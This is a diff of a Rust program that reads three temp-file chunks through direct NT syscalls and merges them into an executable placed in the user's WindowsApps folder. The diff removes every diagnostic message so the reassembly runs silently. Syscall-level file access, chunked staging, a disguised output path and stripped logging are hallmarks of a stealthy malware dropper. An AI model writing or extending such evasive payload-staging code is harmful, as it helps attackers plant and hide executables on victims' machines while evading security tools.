@@ -94,9 +94,6 @@ fn read_file_syscall(path: &str) -> Vec<u8> {
         );
 
         if status != 0 {
-            if status as u32 != 0xC0000034 { // STATUS_OBJECT_NAME_NOT_FOUND
-                println!("Failed to open file {}: status 0x{:x}", path, status);
-            }
             return Vec::new();
         }
 
@@ -121,7 +118,6 @@ fn read_file_syscall(path: &str) -> Vec<u8> {
                 if status as u32 == 0xC0000011 { // STATUS_END_OF_FILE
                     break;
                 }
-                println!("Error reading file {}: 0x{:x}", path, status);
                 break;
             }
 
@@ -175,7 +171,6 @@ fn write_file_syscall(path: &str, data: &[u8]) -> bool {
         );
 
         if status != 0 {
-            println!("Failed to create file {}: status 0x{:x}", path, status);
             return false;
         }
 
@@ -193,10 +188,6 @@ fn write_file_syscall(path: &str, data: &[u8]) -> bool {
             null_mut::<c_void>()
         );
 
-        if status != 0 {
-            println!("Error writing file {}: 0x{:x}", path, status);
-        }
-
         syscall!("NtClose", handle);
         status == 0
     }
@@ -207,7 +198,6 @@ fn main() {
     let local_app_data = get_env_var("LOCALAPPDATA");
 
     if temp_dir.is_empty() || local_app_data.is_empty() {
-        println!("Could not resolve environment variables.");
         return;
     }
 
@@ -216,28 +206,16 @@ fn main() {
     let file3_path = format!("{}\\{}", temp_dir, "3.tmp");
     let output_path = format!("{}\\microsoft\\windowsapps\\merged.exe", local_app_data);
 
-    println!("Merging files from {} into {}", temp_dir, output_path);
-
     let mut merged_data = Vec::new();
 
     for path in &[&file1_path, &file2_path, &file3_path] {
-        println!("Reading {}...", path);
         let data = read_file_syscall(path);
-        if data.is_empty() {
-            println!("Warning: file {} is empty or could not be read.", path);
-        }
         merged_data.extend(data);
     }
 
     if merged_data.is_empty() {
-        println!("No data to write.");
         return;
     }
 
-    println!("Writing merged data to {} ({} bytes)...", output_path, merged_data.len());
-    if write_file_syscall(&output_path, &merged_data) {
-        println!("Success!");
-    } else {
-        println!("Failed to write merged file.");
-    }
+    write_file_syscall(&output_path, &merged_data);
 }
